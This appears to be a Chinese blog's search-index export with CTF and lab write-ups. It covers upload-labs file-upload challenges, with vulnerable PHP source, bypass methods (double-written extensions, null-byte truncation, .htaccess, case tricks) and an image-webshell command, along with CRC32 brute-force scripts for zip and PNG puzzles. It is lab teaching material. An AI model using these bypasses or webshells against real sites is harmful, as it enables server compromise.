<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[upload-labs-三]]></title>
    <url>%2F2019%2F08%2F17%2Fupload-labs-%E4%B8%89%2F</url>
    <content type="text"><![CDATA[第十关 源码： 12345678910111213141516$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,"", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 审计：str_ireplace() 函数替换字符串中的一些字符（不区分大小写）。$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);这段代码的意思就是，讲文件名字替换为空。所以我们可以双写过滤。上传绕过： 第十一关 源码： 123456789101112131415$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125; 审计：1.$file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);截取文件后缀，具体的函数百度吧。既然是截取文件后缀然后在看后缀是否在对应数组中，随意我们可以试一下00截断。我至今才明白00截断漏洞的原理是截断目录。而目录截断会有多种方式比如这个题的方式就是get得到目录的路径。上传绕过： 第十二关 源码： 123456789101112131415$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传失败"; &#125; &#125; else &#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125; 审计：这里第十一关的区别为是post型接受路径。上传绕过：要注意加号的hex为2b。 第十三关 源码： 123456789101112131415161718192021222324252627282930313233343536function getReailFileType($filename)&#123; $file = fopen($filename, "rb"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack("C2chars", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;&#125; 审计：1.fopen() 函数fopen() 函数打开文件或者 URL。2.fread()函数fread() 函数读取文件（可安全用于二进制文件）。3.unpack()函数unpack() 函数从二进制字符串对数据进行解包。4.图片马制作copy 1.png/b+shell.php webshell.png上传绕过：在这里我们上传之后，执行的的时候只能看到图片并不能执行里面的代码，要配合文件上传漏洞。 第十四关 源码： 12345678910111213141516171819202122232425262728function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传出错！"; &#125; &#125; &#125; 审计：1.getimagesize()函数用于获取图像大小及相关信息，成功返回一个数组.。getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。2.image_type_to_extension — 根据指定的图像类型返回对应的后缀名。上传绕过:与第十六关一样。 第十五关源码： 12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return "gif"; break; case IMAGETYPE_JPEG: return "jpg"; break; case IMAGETYPE_PNG: return "png"; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;&#125; 审计：1.exif_imagetype()exif_imagetype() — 判断一个图像的类型说明int exif_imagetype ( string $filename )exif_imagetype() 读取一个图像的第一个字节并检查其签名。代码审计：上传图片码 第十六关源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,"."),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = "该文件不是jpg格式的图片！"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".jpg"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;else if(($fileext == "png") &amp;&amp; ($filetype=="image/png"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = "该文件不是png格式的图片！"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".png"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = "该文件不是gif格式的图片！"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".gif"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;else&#123; $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！"; &#125;&#125; 审计：1.basename() 函数返回路径中的文件名部分。2.strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。3.imagecreatefromjpeg() 返回一图像标识符，代表了从给定的文件名取得的图像。成功时返回图像资源标识符，错误时返回false。 imagejpeg-将图像输出到浏览器或文件 。bool imagejpeg ( resource image [, string filename [, int quality]] )上文的im就是imagecreatefromjepeg()返回的结果。 unlink() 函数删除文件。@就是不报错。]]></content>
      <categories>
        <category>漏洞原理</category>
        <category>文件上传</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python之zipfile模块]]></title>
    <url>%2F2019%2F08%2F14%2Fpython%E4%B9%8Bzipfile%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[python之zipfile模块 python中zipfile模块实例化解析简介：zipfile是python里用来做zip格式编码的压缩和解压缩的，由于是很常见的zip格式，所以这个模块使用频率也是比较高的。 Python zipfile模块用来做zip格式编码的压缩和解压缩的，要进行相关操作。 首先需要实例化一个 ZipFile 对象。 ZipFile 接受一个字符串格式压缩包名称作为它的必选参数，第二个参数为可选参数，表示打开模式，类似于文件操作，有r/w/a三种模式，分别代表读、写、添加，默认为r，即读模式。 zipfile里有两个非常重要的class, 分别是ZipFile和ZipInfo, 在绝大多数的情况下，我们只需要使用这两个class就可以了。ZipFile是主要的类，用来创建和读取zip文件而ZipInfo是存储的zip文件的每个文件的信息的。一、下面我们就来介绍这两个类的基本操作： 1.比如要读取一个Python zipfile 模块，这里假设filename是一个文件的路径: 12345import zipfilez =zipfile.ZipFile(filename, 'r')#这里的第二个参数用r表示是读取zip文件，w是创建一个zip文件for f in z.namelist():print f 上面的代码是读取一个zip压缩包里所有文件的名字。z.namelist() 会返回压缩包内所有文件名的列表。例子1： 123456import zipfile #引入zipfile类z= zipfile.ZipFile('C:/Users/12521/Desktop/123.zip','r')#以只读的形式文件f=open('C:/Users/12521/Desktop/3.txt','w')#写入文件for i in z.namelist(): #namelist是一个方法，用来列出文件中压缩包名字的方法。 f.write(i + '\n')f.close() 2.读取文件的详细内容。 1234import zipfilez = zipfile.ZipFile(filename, 'r')for i in z.infolist():print i.file_size, i.header_offset 这里使用了z.infolist(), 它返回的就是压缩包内所有文件的信息，就是一个ZipInfo的列表。一个ZipInfo对象中包含了压缩包内一个文件的信息，其中比较常用的是 filename, file_size, header_offset, 分别为文件名，文件大小，文件数据在压缩包中的偏移。其实之前的z.namelist()就是读取的ZipInfo中的filename，组成一个 list返回的。例子2： 1234import zipfile z = zipfile.ZipFile('C:/Users/12521/Desktop/123.zip', 'r') for i in z.infolist(): print (i.filename,i.file_size, i.header_offset,'\n') 3.从压缩包里解压缩出一个文件的方法是使用ZipFile的read方法 123import zipfilez = zipfile.ZipFile(filename, &apos;r&apos;)print z.read(z.namelist()[0]) 例子3： 1234import zipfilefilename="C:/Users/12521/Desktop/3.zip"z=zipfile.ZipFile(filename,'r')print (z.read(z.namelist()[0])) 4.Zipinfo类的基本操作ZipFile.getinfo(name)获取zip文档内指定文件的信息。返回一个zipfile.ZipInfo对象，它包括文件的详细信息。ZipFile.infolist()获取zip文档内所有文件的信息，返回一个zipfile.ZipInfo的列表。 123456import zipfilefilename="C:/Users/12521/Desktop/3.zip"z=zipfile.ZipFile(filename,'r')a=z.getinfo("题目.txt") #getinfo的对象必须是打开的文件print(hex(a.CRC))print(a) 12345678910111213141516171819202122232425262728293031#coding:utf-8import zipfileimport stringimport binascii def CrackCrc(crc): for i in dic: for j in dic: for p in dic: for q in dic: s = i + j + p + q if crc == (binascii.crc32(s) &amp; 0xffffffff): print s f.write(s) return def CrackZip(): for I in range(0,68): file = './out' + str(I) + '.zip' f = zipfile.ZipFile(file, 'r') GetCrc = f.getinfo('data.txt') crc = GetCrc.CRC #以上3行为获取压缩包CRC32值的步骤 print hex(crc) CrackCrc(crc) dic = string.ascii_letters + string.digits + '+/=' f = open('./out.txt', 'w')CrackZip()f.close()]]></content>
      <categories>
        <category>PYTHON</category>
        <category>模块实例解析</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[BUGKU--好多压缩包]]></title>
    <url>%2F2019%2F08%2F14%2FBUGKU-%E5%A5%BD%E5%A4%9A%E5%8E%8B%E7%BC%A9%E5%8C%85%2F</url>
    <content type="text"><![CDATA[下载文件，解压后是68个压缩文件，而且每个文件都是加密的，也没有提示密码，爆破？胡扯，这么多，还不想耗死。 正确思路CRC32碰撞，介绍一下CRC32碰撞： CRC32:CRC本身是“冗余校验码”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。 在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容爆破脚本 12345678910111213141516171819202122232425262728293031#coding:utf-8import zipfileimport stringimport binascii def CrackCrc(crc): for i in dic: for j in dic: for p in dic: for q in dic: s = i + j + p + q if crc == (binascii.crc32(s) &amp; 0xffffffff): #print s f.write(s) return def CrackZip(): for I in range(68): file = 'out' + str(I) + '.zip' f = zipfile.ZipFile(file, 'r') GetCrc = f.getinfo('data.txt') crc = GetCrc.CRC #以上3行为获取压缩包CRC32值的步骤 #print hex(crc) CrackCrc(crc) dic = string.ascii_letters + string.digits + '+/=' f = open('out.txt', 'w')CrackZip()f.close() 脚本总结：1.为什么crc是四个？我们使用winrar压缩包可以查看到压缩包里面的文件大小。(winrar看到的是字节，12345好压看到的是kb)在记事本里面，一个汉字和中文的标点符号两个字节，一个英文字母和英文的标点符号占一个字节。我们猜测是英文字符啊，毕竟中文字符的话有几万个，你要是用中文字符的话和爆破有什么区别呢？所以一个txt里面是四个字符。2.dic，它表示的是字符的范围。其实更保险的话应该是用string.printable,虽然printable更保险，但是时间会更长，毕竟爆破的字符数更多了。这里解出来之后发现是一段base64字符串，也就没有什么区别了，因为base64范围：0-9 A-Z a-z + / = 这64个字符string.ascii_letters + string.digits + ‘+/=’已经完全给包含了，看来还是经验啊，大佬们可能一眼就看穿了这是个base64字符串。base64密文： 1z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA== 关于这个base64，我拿到一般的工具下面解压发现解压的内容是乱码，粘贴复制都不太好使毕竟涉及到格式、编码字符问题，所以干脆我就直接上代码： 12345678import base64f=open('./out.txt','r')a=f.read()text=base64.b64decode(a)f1=open('./out.txt','w')f1.write(str(text))f.close()f1.close() 但是解码出来的东西放到winhex中总比别人多一个字节。所以我有换了另一种方式：直接拿到notepad++使用自带的base64解码，然后放到winhex中。文件尾部是rar的文件尾部，所以补充rar头部：526172211A0700，最后在注释中拿到了flag。]]></content>
      <categories>
        <category>CTF</category>
        <category>杂项</category>
        <category>修改高度和宽度</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[攻防世界-2-1]]></title>
    <url>%2F2019%2F08%2F14%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-2-1%2F</url>
    <content type="text"><![CDATA[python之crc爆破 python脚本之CRC爆破宽度和长度：基础知识先详细解释一下png的文件头： （固定）八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头 （固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13 （固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH） （可变）13位数据块（IHDR) 前四个字节代表该图片的宽 后四个字节代表该图片的高 后五个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method （可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到。也就是说我们可以通过爆破来得到高度和宽度 理论依据png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到。我们上图来解释一下：绿色的部分就是IHDR(代表图片的长和宽)+后五个字节一共是13个字节。黄色的部分就是图片的CRC值一共是四个字节。所以加起来就是十七个字节。目的：写python脚本以至于爆破出已知的的CRC对应的图片宽度或者高度。脚本： 12345678910import structimport binasciiimport os m = open("misc4.png","rb").read()for i in range(1024): c = m[12:16] + struct.pack('&gt;i', i) + m[20:29] crc = binascii.crc32(c) &amp; 0xffffffff if crc == 0x932f8a6b: print(i) 12345678910import structimport binasciiimport os m = open("1.png","rb").read()for i in range(0,65535): c = m[12:20] + struct.pack('&gt;i', i) + m[24:29] crc = binascii.crc32(c) &amp; 0xffffffff if crc == 0x6F03AD71: print(hex(i)) 脚本分析：1.open()打开一张图片，rb是指以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。.read([size])：size 未指定则返回整个文件，如果文件大小 &gt;2 倍内存则有问题，f.read()读到文件尾时返回””(空字串)。也就是读取图片的意思，2.struct.pack(‘&gt;i’, i) 123456789101112131415struct — Interpret bytes as packed binary data将字节解释为压缩二进制数据struct.pack(format, v1, v2, ...)Return a bytes object containing the values v1, v2, … packed according to the format string format. The arguments must match the values required by the format exactly.返回一个字节对象，该对象包含根据格式字符串格式打包的值v1、v2，…。参数必须与格式要求的值完全匹配。第一个参数是后面所有参数的格式字符串，后面的每个参数必须与格式字符串描述一致。eg:h表示short，l表示long； &apos;hhl&apos;表示后面有三个参数，依次是short，short，long类型 c表示 char，bytes of length 1（长度的byte数组），i表示integer 整数；&apos;ci&apos;表示后面有两个个参数，依次是char，integer 类型 struct的pack函数把任意数据类型变成字符串： 123import structstruct.pack('&gt;I', 10240099)'\x00\x9c@c' ‘pack的第一个参数是处理指令，’&gt;I’的意思是：&gt;表示字节顺序是big-endian，也就是网络序，I表示4字节无符号整数(四个字节正好对应winhex中的高或者宽)。说白了就是进行一个数据转换问题。因为我们在for i in range中的i是一个整数，但是我们需要与winhex中的数据 进行拼接，所以理所应当的进行数据转化。4.crc = binascii.crc32(c) &amp; 0xffffffff这句话就是将c的值利用binascii模块的crc方法转化为crc，关于后面的0xffffff： 在 Python 2.x 的版本中，binascii.crc32 所计算出來的 CRC 值域为[-2^31, 2^31-1] 之间的有符号整数，为了要与一般CRC 结果作比对，需要将其转为无符号整数，所以加上&amp; 0xffffffff来进行转换。如果是 Python 3.x 的版本，其计算结果为 [0, 2^32-1] 间的无符号整数，因此不需额外加上&amp; 0xffffffff 。5.c = m[12:16] + struct.pack(‘&gt;i’, i) + m[20:29]这句话理解比较好理解但是我在m[12:16]这里比较疑惑，就是说到底包不包含第12或者第16?因此我们可以看到python中是从0开始的而且不包括后面的数组类似开区间和闭区间。m[12:16]：第一行的49到第二行的00(但是不包括)m[20:29]：第二行的第五个00到第二行的93(不包括)，93恰好是crc值的第一个值。所以中间的就是我们要爆破出来的宽度。(宽度是四个字节我们在这里只是把十进制数变成了十六进制) os模块在自动化测试中，经常需要查找操作文件，比如说查找配置文件（从而读取配置文件的信息），查找测试报告（从而发送测试报告邮件），经常要对大量文件和大量路径进行操作，这就依赖于os模块。 最终结果：最后我加一个print(hex(i))，毕竟还要在winhex中修改哎ps：这道题的思路就是注意图片属性可能找不到高度和宽度信息，而且winhex中的宽度和高度数据不正常。]]></content>
      <categories>
        <category>CTF</category>
        <category>杂项</category>
        <category>修改高度和宽度</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[BUGKU-论剑]]></title>
    <url>%2F2019%2F08%2F14%2FBUGKU-%E8%AE%BA%E5%89%91%2F</url>
    <content type="text"><![CDATA[一开始以为这道题是一道简单的小杂项，后来里面设计到许多的知识点。 这是一个jpg图片，以前知道如何修改png的高和宽，换做是jpg竟然不知道了，网上说是先寻找FF2C。3字节后即图片的高与宽信息：什么是字节？几个数是一个字节？既然判断不出来那个数表示高和宽？我们可以讲图片的高和宽的十进制转化为十六进制。在python中： 123456g=66h=hex(g)print(h)s=781d=hex(781)print(d) 然后我们在winhex中搜索：我一开始搜索0x30d，然后我就在winhex中输入30d但是找不到，后来发现原来是winhex中的每个十六进制是四位数，不足四位数去掉0x补0。即0x30d为030d。0x42即0042。我们在winhex中查看一下：FFC2之后的三个字节后的八个字节就是高和宽。因此在winhex中两个数即位一个字节。因此我们修改宽和高。最终得到的图片为：发现图片被挡住了，我们在查看一下分离出来的呢张图片： 123456789g='0110110101111001011011100110000101101101011001010110100101110011011010110110010101111001001000010010000100100001011010000110100001101000'b=''e=0for i in range(len(g)): e+=1print(e)for i in range(0,136,8): b+=chr(int(g[i:i+8],2))print(b) 其实在一开始我是没有发现这些二进制数值的，毕竟文本太多了所以在以后要涨记性了。关于搜索文本我们在winhex中使用一下方法，我们使用同步搜搜一或者零：我们查到16进制之发现在十六进制后面有一个8对应38(这里要注意右侧文本中一个字母对应左侧两个数字注意是数字)，8之后是38 7B BC AF 27 1C 而7z的压缩包文件头为37 7A BC AF 27 1C。所以我们在这里修改一下(这里为什么说是从38开始修改呢？因为8之前是二进制我们总不能把二进制数据修改了吧)：保存好之后，我们在kali中使用binwalk。一开始我们是使用：root@kali:~# binwalk &#39;/root/桌面/lunjian.jpg&#39; -e我们看到只是显示出来包含文件：所以我们使用dd命令(这个命令我从来没使用过。。。0)root@kali:~# dd if=&#39;/root/桌面/lunjian.jpg&#39; of=8.zip bs=1 skip=9591一开始是bs=2，后来我该了为1就好使了。。。emmmmmmm不知道为啥。之后我们打开压缩包有一个图片修改长度也是一个模糊的flag，与之前的比较得到flag。flag{666c61677B6D795F6E616D655F482121487D}}注意前面提醒了是not flagemmmmmmmm。最后我们解密：flag{my_name_H!!H} 这里讲一下base64、base32、base16Base64： 包含大写字母（A-Z）,小写字母（a-z），数字（0-9）以及+/;Base32: 而Base32中只有大写字母（A-Z）和数字234567；Base16: 而Base16就是16进制，他的范围是数字(0-9)，字母（ABCDEF）； 顺便说一句，当ASCll用Base加密达不到所对应的位数的时候用=号补齐； 在这里附带由三种Base加密的:I love you！ Base64:SSBsb3ZlIHlvde+8gQ== Base32:JEQGY33WMUQHS33V566IC=== Base16:49206c6f766520796f75efbc81]]></content>
      <categories>
        <category>CTF</category>
        <category>杂项</category>
        <category>修改高度和宽度</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[upload-labs-二]]></title>
    <url>%2F2019%2F08%2F06%2Fupload-labs-%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[我们进行文件上传第二阶段。 第四关 12345678910111213141516171819202122232425262728&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 审计：跟第三关差不多，但是限制了好多文件名后缀。然而有一种文件格式没禁用，那就是.htaccess。 重要知识:.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。启用.htaccess，需要修改httpd.conf，启用AllowOverride(将该值改为all)，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。它里面有这样一段代码：AllowOverride None，如果我们把None改成All笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 上传绕过：一开始在win下面发现文件名字必须输入东西不然保存不了后来，保存的时候选择所有文件才弄好了：最终得以上传： 第五关源码： 1234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 审计： 源码跟第四关差不多就是过滤了htacess文件。emmmmmmmm，差不多？但是他没进行大小写限制哎。哈哈哈哈哈哈哈哈哈哈。但是他却对文件名字进行了重命名，意味着htacess的前缀肯定是有东西的，以至于它里面的内容不会起作用。因此我们就不能上传htaccess文件，这时候我们只能上传php并且大小写绕过。绕过上传： 第六关源码： 1234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 审计：大小写限制、限制htaccess、上传文件重命名、删除文件后面的点。但是他没有去掉空格哎。emmmmmmmmmmm上传绕过：我们在windows下是无法制造出空格只能抓包改。 第七关源码： 123456789101112131415161718192021222324252627&lt;?$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = 